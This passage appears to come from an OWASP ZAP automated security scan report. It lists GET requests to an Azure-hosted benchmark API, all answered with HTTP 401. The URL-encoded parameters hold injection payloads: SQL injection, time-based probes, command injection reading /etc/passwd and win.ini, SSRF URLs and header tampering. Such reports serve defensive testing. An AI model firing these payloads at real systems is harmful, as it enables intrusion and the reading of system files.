JfiCopUfDCuHRFLtLrQEnqNUHXSLHdnlLwynTFFJtEsGxSojbixOlDtXTpvTweRytGgcegESyFJXALGdTbjugKefXYbPfgkVTgwLvbgeabYfHPnoKPeafCuNdMGJTUNSkIRCRPyALlGFHaNpNOLUTXfXAKKpijFqCTLpQqBHTDZMmbgppAgBCfmsMhZVDUDwBnkAIZcLkvBEFJUOmXtMsjgpKYivVIBpsHCoYcfqhEvZkcZbOMuaVFqnrucJmccHNOsWKNoORTcTkIdPWnFbSoAqLyAZCvXBIcXltcKsmuIIBSttQXLYmmjFXEupYDcKFtydEAangRCtgtQniWCeulZMrKrTPgTlNqpnZXZAkSbMTFfKdMtKIlJhwomcUjgbAmQdaVOfEkqhCFCefhJkfeYfUxuYifMbFRkZhuuhrJ&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=get-help&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=http%253A%252F%252F%255C1498374535918995670.owasp.org&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=http%253A%252F%252F1498374535918995670.owasp.org&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=http%253A%252F%252Fwww.google.com%252F&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=http%253A%252F%252Fwww.google.com%253A80%252F&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=http%253A%252F%252Fwww.google.com&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=https%253A%252F%252F%255C1498374535918995670.owasp.org&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=https%253A%252F%252F1498374535918995670%25252eowasp%25252eorg&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=https%253A%252F%252F1498374535918995670.owasp.org&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=qmej5n3ng2884ftfkmskpglfx3qzo9nt65fgfzmair2f0d1o7tlz6o9zqzu7&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=response.write%2528884%252C889*897%252C447%2529&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=Set-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=system-property%2528%2527xsl%253Avendor%2527%2529%252F%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=thishouldnotexistandhopefullyitwillnot&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=type+%2525SYSTEMROOT%2525%255Cwin.ini&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=u409zqn4og3f8n0k9qpn41eugs75yx6zxe7jv1yvg9gqwe59dp2row9f&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=URL%253D%2527http%253A%252F%252F1498374535918995670.owasp.org%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=user-data&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%2526cat+%252Fetc%252Fpasswd%2526%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%2526sleep+15.0%2526%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%2526timeout+%252FT+15.0%2526%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%253Bget-help&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%253Bsleep+15.0%253B%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%253Bstart-sleep+-s+15.0&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%257Ctimeout+%252FT+15.0&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522+%252F+sleep%252815%2529+%252F+%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522+UNION+ALL+select+NULL+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2526cat+%252Fetc%252Fpasswd%2526&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2526sleep+15.0%2526&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2526timeout+%252FT+15.0&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2526type+%2525SYSTEMROOT%2525%255Cwin.ini&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%2526cat+%252Fetc%252Fpasswd%2526%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%2526sleep+15.0%2526%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%2526timeout+%252FT+15.0%2526%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%2528&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%2529+UNION+ALL+select+NULL+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%253Bget-help&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%253Bsleep+15.0%253B%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%253Bstart-sleep+-s+15.0&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%257Ctimeout+%252FT+15.0&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+%252F+sleep%252815%2529+%252F+%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+AND+%25271%2527%253D%25271%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+AND+%25271%2527%253D%25272%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+OR+%25271%2527%253D%25271%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+UNION+ALL+select+NULL+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2529+UNION+ALL+select+NULL+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%253B&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%253Bcat+%252Fetc%252Fpasswd%253B&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%253Bget-help&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%253Bget-help+%2523&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%253Bsleep+15.0%253B&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%253Bstart-sleep+-s+15.0&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%253Bstart-sleep+-s+15.0+%2523&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%257Ctimeout+%252FT+15.0&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522%252Bresponse.write%2528269%252C797*27%252C642%2529%252B%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
